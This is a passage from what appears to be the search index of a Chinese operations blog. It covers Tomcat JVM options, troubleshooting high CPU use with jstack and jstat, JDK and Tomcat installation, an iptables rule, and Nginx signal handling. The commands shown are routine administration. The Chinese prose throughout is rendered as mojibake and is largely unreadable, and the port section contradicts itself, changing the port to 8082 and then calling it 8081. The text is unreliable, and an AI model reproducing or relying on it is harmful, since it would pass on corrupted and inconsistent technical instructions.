sizeè®¾ç½®åˆ†é…ç»™æ°¸ä¹…ä»£å¦‚æœè¶…è¿‡è§¦å‘åƒåœ¾æ”¶é›†çš„ç©ºé—´ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚è¯¥é€‰é¡¹å·²è¢«å¦å†³JDK 8ï¼Œå¹¶é€šè¿‡-XXå–ä»£ï¼šMetaspaceSizeé€‰é¡¹ã€‚ æˆ‘æ‰€åœ¨ 1JAVA_OPTS==\"-Xmx512m -XX:MaxPermSize=256m\" åœ¨æˆ‘çš„ç³»ç»Ÿçš„.bashrcï¼Œå°†å…¶æ›´æ”¹ä¸º 1JAVA_OPTS=\"-Djava.awt.headless=true -Dfile.encoding=UTF-8 -server -Xms1024m -Xmx1024m -XX:NewSize=512m -XX:MaxNewSize=512m -XX:+DisableExplicitGC\"","link":"/2016/03/21/WebæœåŠ¡æŠ€æœ¯/tomcat/tomcatä¼˜åŒ–é‡åˆ°jdk1.8å‡ºç°âš ï¸è­¦å‘Šï¼šwarning:ignoring option PermSize=512msupport was removed in 8.0/"},{"title":"è®°å½•tomcatè¿›ç¨‹CPUä½¿ç”¨ç‡é«˜æ’æŸ¥æ•…éšœç»éªŒ","text":"1ã€æ•…éšœç°è±¡è¿è¥åŒäº‹åé¦ˆAPPå…¶ä¸­ä½“æ£€å•†åŸè´­ä¹°è®¢å•ç³»ç»Ÿè¿è¡Œç¼“æ…¢ï¼Œè®¿é—®å‡ºç°è¶…æ—¶ï¼Œå¤šæ¬¡é‡å¯ç³»ç»Ÿåé—®é¢˜ä¾ç„¶å­˜åœ¨ï¼Œä½¿ç”¨topå‘½ä»¤æŸ¥çœ‹æœåŠ¡å™¨æƒ…å†µï¼Œå‘ç°CPUå ç”¨ç‡è¿‡é«˜ã€‚ 2ã€CPUå ç”¨è¿‡é«˜é—®é¢˜å®šä½2.1ã€å®šä½é—®é¢˜è¿›ç¨‹ä½¿ç”¨topå‘½ä»¤æŸ¥çœ‹èµ„æºå ç”¨æƒ…å†µï¼Œå‘ç°pidä¸º14063çš„è¿›ç¨‹å ç”¨äº†å¤§é‡çš„CPUèµ„æºï¼ŒCPUå ç”¨ç‡é«˜è¾¾229.1%ï¼Œå†…å­˜å ç”¨ç‡ä¹Ÿè¾¾åˆ°äº†29.8% 123456789[root@account-tomcat-01 ~]$ toptop - 14:51:10 up 233 days, 11:40, 2 users, load average: 6.85, 5.62, 3.97Tasks: 192 total, 2 running, 190 sleeping, 0 stopped, 0 zombie%Cpu(s): 97.3 us, 0.3 sy, 0.0 ni, 2.5 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 stKiB Mem : 16268652 total, 5114392 free, 6907028 used, 4247232 buff/cacheKiB Swap: 4063228 total, 3989708 free, 73520 used. 8751512 avail Mem PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 14063 root 20 0 9260488 4.627g 11976 S 229.1 29.8 117:41.66 java 2.2ã€å®šä½é—®é¢˜çº¿ç¨‹ä½¿ç”¨ps -mp pid -o THREAD,tid,timeå‘½ä»¤æŸ¥çœ‹è¯¥è¿›ç¨‹çš„çº¿ç¨‹æƒ…å†µï¼Œå‘ç°è¯¥è¿›ç¨‹çš„å¤šä¸ªçº¿ç¨‹å ç”¨ç‡å¾ˆé«˜ 123456789101112131415161718[root@account-tomcat-01 ~]$ ps -mp 14063 -o THREAD,tid,time USER %CPU PRI SCNT WCHAN USER SYSTEM TID TIME 361 - - - - - - 02:05:58root 0.0 19 - futex_ - - 14063 00:00:00root 0.0 19 - poll_s - - 14064 00:00:00root 44.5 19 - - - - 14065 00:15:30root 44.5 19 - - - - 14066 00:15:30root 44.4 19 - - - - 14067 00:15:29root 44.5 19 - - - - 14068 00:15:30root 44.5 19 - - - - 14069 00:15:30root 44.5 19 - - - - 14070 00:15:30root 44.5 19 - - - - 14071 00:15:30root 44.6 19 - - - - 14072 00:15:32root 2.2 19 - futex_ - - 14073 00:00:46root 0.0 19 - futex_ - - 14074 00:00:00root 0.0 19 - futex_ - - 14075 00:00:00root 0.0 19 - futex_ - - 14076 00:00:00root 0.7 19 - futex_ - - 14077 00:00:15 ä»è¾“å‡ºä¿¡æ¯å¯ä»¥çœ‹å‡ºï¼Œ14065~14072ä¹‹é—´çš„çº¿ç¨‹CPUå ç”¨ç‡éƒ½å¾ˆé«˜2.3ã€æŸ¥çœ‹é—®é¢˜çº¿ç¨‹å †æ ˆ æŒ‘é€‰TIDä¸º14065çš„çº¿ç¨‹ï¼ŒæŸ¥çœ‹è¯¥çº¿ç¨‹çš„å †æ ˆæƒ…å†µï¼Œå…ˆå°†çº¿ç¨‹idè½¬ä¸º16è¿›åˆ¶ï¼Œä½¿ç”¨printf â€œ%x\\nâ€ tidå‘½ä»¤è¿›è¡Œè½¬æ¢ 12345678910111213141516[root@account-tomcat-01 ~]$ printf \"%x\\n\" 1406536f1å†ä½¿ç”¨jstackå‘½ä»¤æ‰“å°çº¿ç¨‹å †æ ˆä¿¡æ¯ï¼Œå‘½ä»¤æ ¼å¼ï¼šjstack pid |grep tid -A 30[root@root-web-01 ~]$ jstack 14063 |grep 36f1 -A 30\"GC task thread#0 (ParallelGC)\" prio=10 tid=0x00007fa35001e800 nid=0x36f1 runnable \"GC task thread#1 (ParallelGC)\" prio=10 tid=0x00007fa350020800 nid=0x36f2 runnable \"GC task thread#2 (ParallelGC)\" prio=10 tid=0x00007fa350022800 nid=0x36f3 runnable \"GC task thread#3 (ParallelGC)\" prio=10 tid=0x00007fa350024000 nid=0x36f4 runnable \"GC task thread#4 (ParallelGC)\" prio=10 tid=0x00007fa350026000 nid=0x36f5 runnable \"GC task thread#5 (ParallelGC)\" prio=10 tid=0x00007fa350028000 nid=0x36f6 runnable \"GC task thread#6 (ParallelGC)\" prio=10 tid=0x00007fa350029800 nid=0x36f7 runnable \"GC task thread#7 (ParallelGC)\" prio=10 tid=0x00007fa35002b800 nid=0x36f8 runnable \"VM Periodic Task Thread\" prio=10 tid=0x00007fa3500a8800 nid=0x3700 waiting on condition JNI global references: 392 ä»è¾“å‡ºä¿¡æ¯å¯ä»¥çœ‹å‡ºï¼Œæ­¤çº¿ç¨‹æ˜¯JVMçš„gcçº¿ç¨‹ã€‚æ­¤æ—¶å¯ä»¥åŸºæœ¬ç¡®å®šæ˜¯å†…å­˜ä¸è¶³æˆ–å†…å­˜æ³„éœ²å¯¼è‡´gcçº¿ç¨‹æŒç»­è¿è¡Œï¼Œå¯¼è‡´CPUå ç”¨è¿‡é«˜ã€‚ æ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬è¦æ‰¾çš„å†…å­˜æ–¹é¢çš„é—®é¢˜ 3.1ã€ä½¿ç”¨jstat -gcutilå‘½ä»¤æŸ¥çœ‹è¿›ç¨‹çš„å†…å­˜æƒ…å†µ 12345678910111213[root@account-tomcat-01 ~]$ jstat -gcutil 14063 2000 10 S0 S1 E O P YGC YGCT FGC FGCT GCT 0.00 0.00 100.00 99.99 26.31 42 21.917 218 1484.830 1506.747 0.00 0.00 100.00 99.99 26.31 42 21.917 218 1484.830 1506.747 0.00 0.00 100.00 99.99 26.31 42 21.917 219 1496.567 1518.484 0.00 0.00 100.00 99.99 26.31 42 21.917 219 1496.567 1518.484 0.00 0.00 100.00 99.99 26.31 42 21.917 219 1496.567 1518.484 0.00 0.00 100.00 99.99 26.31 42 21.917 219 1496.567 1518.484 0.00 0.00 100.00 99.99 26.31 42 21.917 219 1496.567 1518.484 0.00 0.00 100.00 99.99 26.31 42 21.917 220 1505.439 1527.355 0.00 0.00 100.00 99.99 26.31 42 21.917 220 1505.439 1527.355 0.00 0.00 100.00 99.99 26.31 42 21.917 220 1505.439 1527.355 ä»è¾“å‡ºä¿¡æ¯å¯ä»¥çœ‹å‡ºï¼ŒEdenåŒºå†…å­˜å ç”¨100%ï¼ŒOldåŒºå†…å­˜å ç”¨99.99%ï¼ŒFull GCçš„æ¬¡æ•°é«˜è¾¾220æ¬¡ï¼Œå¹¶ä¸”é¢‘ç¹Full GCï¼ŒFull GCçš„æŒç»­æ—¶é—´ä¹Ÿç‰¹åˆ«é•¿ï¼Œå¹³å‡æ¯æ¬¡Full GCè€—æ—¶6.8ç§’ï¼ˆ1505.439/220ï¼‰ã€‚æ ¹æ®è¿™äº›ä¿¡æ¯ï¼ŒåŸºæœ¬å¯ä»¥ç¡®å®šæ˜¯ç¨‹åºä»£ç ä¸Šå‡ºç°äº†é—®é¢˜ï¼Œå¯èƒ½å­˜åœ¨ä¸åˆç†åˆ›å»ºå¯¹è±¡çš„åœ°æ–¹ã€‚ ç”Ÿäº§javaåº”ç”¨ï¼ŒCPUä½¿ç”¨ç‡ä¸€ç›´å¾ˆé«˜ï¼Œç»å¸¸è¾¾åˆ°100%ï¼Œé€šè¿‡ä»¥ä¸‹æ­¥éª¤å®Œç¾è§£å†³ï¼Œåˆ†äº«ä¸€ä¸‹ã€‚ 123456789101112131.jps è·å–Javaè¿›ç¨‹çš„PIDã€‚2.top -H -p PID æŸ¥çœ‹å¯¹åº”è¿›ç¨‹çš„å“ªä¸ªçº¿ç¨‹å ç”¨CPUè¿‡é«˜ã€‚2.1 ä½¿ç”¨ ps -mp pid -o THREAD,tid,time å‘½ä»¤æŸ¥çœ‹è¯¥è¿›ç¨‹çš„çº¿ç¨‹æƒ…å†µï¼Œå‘ç°è¯¥è¿›ç¨‹çš„å¤šä¸ªçº¿ç¨‹å ç”¨ç‡å¾ˆé«˜ã€‚3.jstack pid &gt;&gt; java.txt å¯¼å‡ºCPUå ç”¨é«˜è¿›ç¨‹çš„çº¿ç¨‹æ ˆã€‚ä½¿ç”¨jstackå‘½ä»¤æŸ¥çœ‹è¿›ç¨‹çš„å †æ ˆæƒ…å†µ4.echo â€œobase=16; PIDâ€ | bc å°†çº¿ç¨‹çš„PIDè½¬æ¢ä¸º16è¿›åˆ¶ã€‚5.åœ¨ç¬¬äºŒæ­¥å¯¼å‡ºçš„Java.txtä¸­æŸ¥æ‰¾è½¬æ¢æˆä¸º16è¿›åˆ¶çš„çº¿ç¨‹PIDã€‚æ‰¾åˆ°å¯¹åº”çš„çº¿ç¨‹æ ˆã€‚6.åˆ†æè´Ÿè½½é«˜çš„çº¿ç¨‹æ ˆéƒ½æ˜¯ä»€ä¹ˆä¸šåŠ¡æ“ä½œã€‚ä¼˜åŒ–ç¨‹åºå¹¶å¤„ç†é—®é¢˜ã€‚","link":"/2016/12/02/WebæœåŠ¡æŠ€æœ¯/tomcat/è®°å½•tomcatè¿›ç¨‹CPUä½¿ç”¨ç‡é«˜æ’æŸ¥æ•…éšœç»éªŒ/"},{"title":"æ­å»ºé…ç½®tomcatç¯å¢ƒ","text":"å…ˆå®‰è£…jdk-javaç¯å¢ƒé¦–å…ˆå…ˆæ£€æŸ¥linuxæœºå™¨ä¸Šæ˜¯å¦æœ‰è‡ªå¸¦çš„jdk,ä¸€èˆ¬ä¸å»ºè®®ç”¨yumå®‰è£…ï¼Œç¯å¢ƒå˜é‡ä¸æ–¹ä¾¿è‡ªå®šä¹‰ã€‚ java -versionæ£€æŸ¥ä¸‹å°±å¯ä»¥ï¼Œå¦‚æœæœ‰ç‰ˆæœ¬ä½çš„è¯å¯ä»¥å…ˆå¸è½½æ‰æ–¹æ³•å¦‚ä¸‹ï¼š 1234[root@localhost java]# rpm -qa|grep gcj æˆ–è€… rpm -qa|grep javalibgcj-4.1.2-44.el5java-1.4.2-gcj-compat-1.4.2.0-40jpp.115 å¦‚æœæ²¡æœ‰ä¿¡æ¯å°±æ˜¯æ²¡æœ‰å®‰è£…ã€å¦‚æœæœ‰é‚£ä¹ˆå¦‚ä¸‹æ“ä½œ: 123[root@localhost]# yum -y remove java-1.4.2-gcj-compat-1.4.2.0-40jpp.115 æˆ–è€… rpm -e --nodeps java-1.4.2-gcj-compat-1.4.2.0-40jpp.115Complete!(çœ‹åˆ°è¿™ä¸ªè¯´æ˜å®Œæˆäº†ã€‚ã€‚) å¸è½½å®Œæˆäº† å¦‚æœå…¶ä»–ç›®å½•æœ‰è¿™ä¸ªå®‰è£…å¥½çš„ã€‚ç›´æ¥æ‹·è´è¿‡å»ï¼Œåšä¸ªå˜é‡å°±è¡Œ. JDKå®˜ç½‘ä¸‹è½½åœ°å€ï¼šjdk-8u60-linux-x64.tar.gz 123ä¸‹è½½jdkå‘½ä»¤ï¼šwget --header \"Cookie: oraclelicense=accept-securebackup-cookieâ€ http://download.oracle.com/otn-pub/java/jdk/8u144-b01/090f390dda5b47b9b721c7dfaa008135/jdk-8u144-linux-x64.tar.gz ç¼–è¯‘å®‰è£…jdk 12345678curl -O http://oak0aohum.bkt.clouddn.com/jdk1.7.0_67.tar.gz -C /srv/è®¾ç½®ç¯å¢ƒå˜é‡ï¼šcd /etc/profile.d/ æ”¾åˆ°è¿™ä¸‹é¢å†™ä¸ªå˜é‡java.shexport JAVA_HOME=/srv/jdk1.7.0_67export CLASS_PATH=\"$JAVA_HOME/lib:$JAVA_HOME/jre/lib\"export PATH=$PATH:$JAVA_HOME/bin æ·»åŠ å®Œæ¯•ä¿å­˜é€€å‡º. 123source /etc/profileecho $JAVA_HOME/usr/java/jdk1.7.0 å®‰è£…ï¼šapache-tomcat å…ˆä¸‹è½½tomcatåŒ…ï¼šapache-tomcat-8.0.41-src.tar.gz é…ç½®ç«¯å£ bä¸è¦æœ‰å†²çªäº†é»˜è®¤æ˜¯8080è¿™é‡Œä¿®æ”¹æˆ8082ã€‚ ï¼ˆ1ï¼‰é‡‡ç”¨è®°äº‹æœ¬æ‰“å¼€Tomcatå®‰è£…ç›®å½•ä¸‹çš„confæ–‡ä»¶å¤¹ä¸‹çš„servlet.xmlæ–‡ä»¶ã€‚ï¼ˆ2ï¼‰åœ¨servlet.xmlæ–‡ä»¶ä¸­æ‰¾åˆ°ä»¥ä¸‹ä»£ç ï¼š 123 &lt;Connector port=\"8082\" protocol=\"HTTP/1.1\" URIEncoding=\"UTF-8\"connectionTimeout=\"20000\" redirectPort=\"8443\" /&gt; ï¼ˆ3ï¼‰å°†ä¸Šé¢ä»£ç ä¸­çš„port=&quot;8080&quot;ä¿®æ”¹ä¸ºport=&quot;8082&quot;ï¼Œå³å¯å°†Tomcatçš„é»˜è®¤ç«¯å£è®¾ç½®ä¸º8081ã€‚åœ¨ä¿®æ”¹ç«¯å£æ—¶ï¼Œåº”é¿å…ä¸å…¬ç”¨ç«¯å£å†²çªã€‚å»ºè®®é‡‡ç”¨é»˜è®¤çš„8080ç«¯å£ï¼Œä¸è¦ä¿®æ”¹ï¼Œé™¤é8080ç«¯å£è¢«å…¶ä»–ç¨‹åºæ‰€å ç”¨ã€‚ Connectorå­å…ƒç´ ä¸‹çš„portæ˜¯è®¾ç½®æœåŠ¡å™¨ç«¯å£ï¼Œè€Œconnection Timeoutåˆ™æ˜¯æœåŠ¡å™¨è¿æ¥è¶…æ—¶å•ä½ä¸ºæ¯«ç§’. ï¼ˆ4ï¼‰URIEncoding=â€UTF-8 è®¾ç½®æ˜¯è®©tomcatæ”¯æŒä¸­æ–‡ï¼Œä¸ä¼šå‡ºç°ä¹±ç  ###é…ç½®é˜²ç«å¢™ å…è®¸ç„¶åæŠŠ8082 è¿™ä¸ªç«¯å£å¼€æ”¾åˆ°æŒ‡å®šçš„åŠå…¬ç½‘ç»œç«¯å£è®¿é—®ã€‚ 1-A INPUT -i eth0 -s 192.168.1.0/24 -p tcp -m state --state NEW -m tcp --dport 8082 -j ACCEPT è¿›å…¥linuxç³»ç»Ÿä¸‹tomcatçš„binç›®å½•ï¼Œ æ¯”å¦‚ï¼Œè¿›å…¥åˆ° apache-tomcat-7.0.42/bin ç›®å½• å…³é—­ä¸€ä¸‹tomcatæœåŠ¡ï¼Œç‰¹åˆ«æ˜¯å·²ç»å¯åŠ¨çš„æƒ…å†µä¸‹ï¼Œåªä¸è¿‡æœ‰äº›å¼‚å¸¸ 1./shutdown.sh ####3. æ£€æŸ¥tomcatå¯åŠ¨è¿›ç¨‹ ps -ef|grep tomcat å‡å¦‚å‡ºç°ä»¥ä¸‹ç±»ä¼¼çš„æç¤ºï¼Œè¡¨ç¤ºtomcatå·²ç»å…³é—­ root 30248 30113 0 10:00 pts/0 00:00:00 grep java ####4. æœ€åé‡æ–°å¯åŠ¨tomcat 1./startup.sh ä¹Ÿå¯ä»¥å†™å¯åŠ¨è„šæœ¬ï¼Œé…ç½®å¥½jdkå’Œtomcatçš„ç¯å¢ƒå˜é‡ã€‚","link":"/2015/11/21/WebæœåŠ¡æŠ€æœ¯/tomcat/æ­å»ºé…ç½®tomcatç¯å¢ƒ/"},{"title":"Nginx çš„å¯åŠ¨ã€åœæ­¢ã€å¹³æ»‘é‡å¯ã€ä¿¡å·æ§åˆ¶å’Œå¹³æ»‘å‡çº§","text":"Nginx çš„å¯åŠ¨ã€åœæ­¢ã€å¹³æ»‘é‡å¯ã€ä¿¡å·æ§åˆ¶å’Œå¹³æ»‘å‡çº§Nginxçš„å¯åŠ¨å‡è®¾ nginx å®‰è£…åœ¨/usr/local/nginx ç›®å½•ä¸­ï¼Œé‚£ä¹ˆå¯åŠ¨ nginx çš„å‘½ä»¤å°±æ˜¯ï¼š 1[root@Nginx_01 ~]# /usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf å‚æ•°&quot;-c&quot; æŒ‡å®šäº†é…ç½®æ–‡ä»¶çš„è·¯å¾„ï¼Œå¦‚æœä¸åŠ &quot;-c&quot;å‚æ•°ï¼ŒNginx ä¼šé»˜è®¤åŠ è½½å…¶å®‰è£…ç›®å½•çš„ conf å­ç›®å½•ä¸­çš„ nginx.conf æ–‡ä»¶ã€‚ Nginxçš„åœæ­¢nginx çš„åœæ­¢æ–¹æ³•æœ‰å¾ˆå¤šï¼Œä¸€èˆ¬é€šè¿‡å‘é€ç³»ç»Ÿä¿¡å·ç»™ nginx çš„ä¸»è¿›ç¨‹çš„æ–¹å¼æ¥åœæ­¢ nginxã€‚ 1ã€ä»å®¹åœæ­¢Nginx 123[root@Nginx_01 ~]# kill -QUIT ã€Nginxä¸»è¿›ç¨‹å·ã€‘æˆ–è€…[root@Nginx_01 ~]# kill -QUIT `/usr/local/nginx/logs/nginx.pid` å­—ç¬¦æ˜¯æ•°å­—é”®ç›˜ 1 å­—ç¬¦å·¦è¾¹çš„é‚£ä¸ªå­—ç¬¦ï¼Œä¸éœ€è¦ Shiftï¼Œç›´æ¥æŒ‰ ` å­—ç¬¦å³å¯ã€‚å¦‚æœåœ¨ nginx.conf é…ç½®æ–‡ä»¶ä¸­æŒ‡å®šäº† pid æ–‡ä»¶å­˜æ”¾çš„è·¯å¾„ï¼Œè¯¥æ–‡ä»¶ä¸­å­˜æ”¾çš„å°±æ˜¯ nginx å½“å‰çš„ä¸»è¿›ç¨‹å·ã€‚é»˜è®¤æ˜¯æ”¾åœ¨ nginx å®‰è£…ç›®å½•çš„ logs ç›®å½•ä¸‹ã€‚ 2ã€å¿«é€Ÿåœæ­¢Nginx 12345678[root@Nginx_01 ~]# kill -TERM ã€Nginxä¸»è¿›ç¨‹å·ã€‘æˆ–è€…[root@Nginx_01 ~]# kill -INT ã€Nginxä¸»è¿›ç¨‹å·ã€‘ ``` &gt;3ã€å¼ºåˆ¶åœæ­¢æ‰€æœ‰ nginx è¿›ç¨‹ ```bash[root@Nginx_01 ~]# pkill -9 nginx Nginxçš„å¹³æ»‘å¯åŠ¨å¦‚æœæ”¹å˜äº† nginx çš„é…ç½®æ–‡ä»¶ï¼Œæƒ³é‡å¯ nginxï¼ŒåŒæ ·å¯ä»¥å‘é€ç³»ç»Ÿä¿¡å·ç»™ nginx ä¸»è¿›ç¨‹çš„æ–¹å¼æ¥è¿›è¡Œã€‚ä¸è¿‡ï¼Œé‡å¯ä¹‹å‰ï¼Œè¦ç¡®è®¤ nginx é…ç½®æ–‡ä»¶çš„è¯­æ³•æ˜¯å¦æ­£ç¡®çš„ã€‚å¦åˆ™ nginx å°†ä¸ä¼šåŠ è½½æ–°çš„é…ç½®æ–‡ä»¶ã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥åˆ¤æ–­é…ç½®æ–‡ä»¶æ˜¯å¦æ­£ç¡®ï¼š 123456789# -t å‚æ•°å°†æ£€æŸ¥é…ç½®æ–‡ä»¶çš„è¯­æ³•æ˜¯å¦æ­£ç¡®ï¼Œé»˜è®¤ä¼šæ£€æŸ¥ /usr/local/nginx/conf/nginx.conf æ–‡ä»¶ã€‚ [root@Nginx_01 ~]# /usr/local/nginx/sbin/nginx -t # å¦‚æœè¦å¯¹æŒ‡å®šçš„é…ç½®æ–‡ä»¶è¿›è¡Œè¯­æ³•æ£€æŸ¥ï¼Œå¯ä»¥ç»§ç»­æ·»åŠ  -c å‚æ•° [root@Nginx_01 ~]# /usr/local/nginx/sbin/nginx -t -c /usr/local/nginx/conf/nginx.conf è¿™ä¸ªæ—¶å€™ï¼Œå°±å¯ä»¥å¹³æ»‘é‡å¯ nginx äº†ã€‚ [root@Nginx_01 ~]# kill -HUP ã€Nginxä¸»è¿›ç¨‹å·ã€‘ å½“ nginx æ¥æ”¶åˆ° HUP ä¿¡å·æ—¶ï¼Œå®ƒä¼šå°è¯•å…ˆè§£æé…ç½®æ–‡ä»¶ï¼Œå¦‚æœæˆåŠŸï¼Œå°±åº”ç”¨æ–°çš„é…ç½®æ–‡ä»¶(ä¾‹å¦‚ï¼Œé‡æ–°æ‰“å¼€æ—¥å¿—æ–‡ä»¶æˆ–ç›‘å¬çš„å¥—æ¥å­—)ã€‚ä¹‹åï¼Œnginx è¿è¡Œæ–°çš„å·¥ä½œè¿›ç¨‹å¹¶ä»å®¹å…³é—­æ—§çš„å·¥ä½œè¿›ç¨‹ã€‚é€šçŸ¥å·¥ä½œè¿›ç¨‹å…³é—­ç›‘å¬å¥—æ¥å­—ï¼Œä½†æ˜¯ç»§ç»­ä¸ºå½“å‰è¿æ¥çš„å®¢æˆ·æä¾›æœåŠ¡ã€‚æ‰€æœ‰çš„å®¢æˆ·ç«¯çš„æœåŠ¡å®Œæˆåï¼Œæ—§çš„å·¥ä½œè¿›ç¨‹è¢«å…³é—­ã€‚å¦‚æœæ–°çš„é…ç½®æ–‡ä»¶åº”ç”¨å¤±è´¥ï¼Œnginx å°†ç»§ç»­ä½¿ç”¨æ—§çš„é…ç½®æ–‡ä»¶è¿›è¡Œå·¥ä½œã€‚ Nginx çš„å¹³æ»‘å‡çº§å½“éœ€è¦å°†æ­£åœ¨è¿è¡Œä¸­çš„ nginx å‡çº§ã€æ·»åŠ /åˆ é™¤æœåŠ¡å™¨æ¨¡å—æ—¶ï¼Œå¯ä»¥åœ¨ä¸ä¸­æ–­æœåŠ¡çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨æ–°ç‰ˆæœ¬ã€é‡ç¼–è¯‘çš„ nginx å¯æ‰§è¡Œç¨‹åºæ›¿æ¢æ—§ç‰ˆæœ¬çš„è¯¾æ‰§è¡Œç¨‹åºã€‚æ­¥éª¤å¦‚ä¸‹ï¼š 12345678910111213141516171819(1) ä½¿ç”¨æ–°çš„å¯æ‰§è¡Œç¨‹åºæ›¿æ¢æ—§çš„å¯æ‰§è¡Œç¨‹åºï¼Œå¯¹äºç¼–è¯‘å®‰è£…çš„ nginxï¼Œå¯ä»¥å°†æ–°ç‰ˆæœ¬ç¼–è¯‘å®‰è£…åˆ°æ—§ç‰ˆæœ¬çš„ nginx å®‰è£…è·¯å¾„ä¸­ã€‚æ›¿æ¢ä¹‹å‰ï¼Œæœ€å¥½å¤‡ä»½ä¸€ä¸‹æ—§çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ (2) å‘é€ä»¥ä¸‹æŒ‡ä»¤ï¼š [root@Nginx_01 ~]# kill -USR2 ã€æ—§é¢å¸ƒçš„Nginxä¸»è¿›ç¨‹å·ã€‘ (3) æ—§ç‰ˆæœ¬ nginx çš„ä¸»è¿›ç¨‹å°†é‡å‘½åå®ƒçš„ pid æ–‡ä»¶ä¸º .oldbin(ä¾‹å¦‚ï¼š/usr/local/nginx/logs/nginx.pid.oldbin)ï¼Œç„¶åæ‰§è¡Œæ–°ç‰ˆæœ¬çš„ nginx å¯æ‰§è¡Œç¨‹åºï¼Œä¾æ¬¡å¯åŠ¨æ–°çš„ä¸»è¿›ç¨‹å’Œæ–°çš„å·¥ä½œè¿›ç¨‹ã€‚ (4) æ­¤æ—¶ï¼Œæ–°ã€æ—§ç‰ˆæœ¬çš„ nginx å®ä¾‹ä¼šåŒæ—¶è¿è¡Œï¼Œå…±åŒå¤„ç†è¾“å…¥çš„è¯·æ±‚ã€‚è¦é€æ­¥åœæ­¢æ—§ç‰ˆæœ¬çš„ nginx å®ä¾‹ï¼Œä½ å¿…é¡»å‘é€ WINCH ä¿¡å·ç»™æ—§çš„ä¸»è¿›ç¨‹ï¼Œç„¶åï¼Œå®ƒçš„å·¥ä½œè¿›ç¨‹å°±å°†å¼€å§‹ä»å®¹å…³é—­ï¼š[root@Nginx_01 ~]# kill -WINCH ã€æ—§ç‰ˆæœ¬çš„Nginxä¸»è¿›ç¨‹å·ã€‘ (5) ä¸€æ®µæ—¶é—´åï¼Œæ—§çš„å·¥ä½œè¿›ç¨‹(worker process)å¤„ç†äº†æ‰€æœ‰å·²è¿æ¥çš„è¯·æ±‚åé€€å‡ºï¼Œä»…ç”±æ–°çš„å·¥ä½œè¿›ç¨‹æ¥å¤„ç†è¾“å…¥çš„è¯·æ±‚äº†ã€‚ (6) è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥å†³å®šæ˜¯ä½¿ç”¨æ–°ç‰ˆæœ¬ï¼Œè¿˜æ˜¯æ¢å¤åˆ°æ—§ç‰ˆæœ¬ï¼š [root@Nginx_01 ~]# kill -HUP ã€æ—§çš„ä¸»è¿›ç¨‹å·ã€‘ï¼šnginx å°†åœ¨ä¸é‡è½½é…ç½®æ–‡ä»¶çš„æƒ…å†µä¸‹å¯åŠ¨å®ƒçš„å·¥ä½œè¿›ç¨‹ [root@Nginx_01 ~]# kill -QUIT ã€æ–°çš„ä¸»è¿›ç¨‹å·ã€‘ï¼šä»å®¹å…³é—­å…¶å·¥ä½œè¿›ç¨‹(worker process) [root@Nginx_01 ~]# kill -TERM ã€æ–°çš„ä¸»è¿›ç¨‹å·ã€‘ï¼šå¼ºåˆ¶é€€å‡º [root@Nginx_01 ~]# kill ã€æ–°çš„ä¸»è¿›ç¨‹å·æˆ–æ—§çš„ä¸»è¿›ç¨‹å·ã€‘ï¼šå¦‚æœå› ä¸ºæŸäº›åŸå› æ–°çš„å·¥ä½œè¿›ç¨‹ä¸èƒ½é€€å‡ºï¼Œåˆ™å‘å…¶å‘é€ kill ä¿¡å· æ–°çš„ä¸»è¿›ç¨‹é€€å‡ºåï¼Œæ—§çš„ä¸»è¿›ç¨‹ä¼šç§»é™¤ .oldbin åç¼€ï¼Œæ¢å¤ä¸ºå®ƒ çš„ .pid æ–‡ä»¶ï¼Œè¿™æ ·ï¼Œä¸€åˆ‡å°±æ¢å¤åˆ°å‡çº§ä¹‹å‰äº†ã€‚å¦‚æœå°è¯•å‡çº§æˆåŠŸï¼Œè€Œä½ ä¹Ÿå¸Œæœ›ä¿ç•™æ–°çš„æœåŠ¡å™¨æ—¶ï¼Œå¯å‘é€ QUIT ä¿¡å·ç»™æ—§çš„ä¸»è¿›ç¨‹ï¼Œä½¿å…¶é€€å‡ºè€Œåªç•™ä¸‹æ–°çš„æœåŠ¡å™¨è¿è¡Œã€‚ 1234567891011121314151617ä¸Šå›¾æ˜¯nginxå®˜æ–¹ç½‘ç«™å¯¹nginxä¿¡å·çš„è§£é‡Šæ–‡æ¡£æˆªå–ä¸‹é¢æ˜¯ä¸€äº›å¸¸è§nginxå‘½ä»¤nginx -c /path/to/nginx.conf // ä»¥ç‰¹å®šç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶å¯åŠ¨nginx:nginx -s reload // ä¿®æ”¹é…ç½®åé‡æ–°åŠ è½½ç”Ÿæ•ˆnginx -s reopen // é‡æ–°æ‰“å¼€æ—¥å¿—æ–‡ä»¶nginx -s stop // å¿«é€Ÿåœæ­¢nginxnginx -s quit // å®Œæ•´æœ‰åºçš„åœæ­¢nginxnginx -t // æµ‹è¯•å½“å‰é…ç½®æ–‡ä»¶æ˜¯å¦æ­£ç¡®nginx -t -c /path/to/nginx.conf //æµ‹è¯•ç‰¹å®šçš„nginxé…ç½®æ–‡ä»¶æ˜¯å¦æ­£ç¡®","link":"/2016/08/23/WebæœåŠ¡æŠ€æœ¯/Nginx/Nginx çš„å¯åŠ¨ã€åœæ­¢ã€å¹³æ»‘é‡å¯ã€ä¿¡å·æ§åˆ¶å’Œå¹³æ»‘å‡çº§ /"},{"title":"Nginx-åå‘ä»£ç†","text":"Nginx å’Œ apache å¯¹æ¯”ä¸ªäººç†è§£ï¼šå­˜åœ¨å°±æ˜¯ç†ç”±,ä¸€èˆ¬æ¥è¯´,éœ€è¦æ€§èƒ½çš„ web æœåŠ¡,ç”¨ nginx ã€‚å¦‚æœä¸éœ€è¦æ€§èƒ½åªæ±‚ç¨³å®š, é‚£å°± apache å§ã€‚åè€…çš„å„ç§åŠŸèƒ½æ¨¡å—å®ç°å¾—æ¯”å‰è€…,ä¾‹å¦‚ ssl çš„æ¨¡å—å°±æ¯”å‰è€…å¥½,å¯é… ç½®é¡¹å¤šã€‚ è¿™é‡Œè¦æ³¨æ„ä¸€ç‚¹,epoll(freebsd ä¸Šæ˜¯ kqueue )ç½‘ç»œ IO æ¨¡å‹æ˜¯ nginx å¤„ç†æ€§èƒ½ é«˜çš„æ 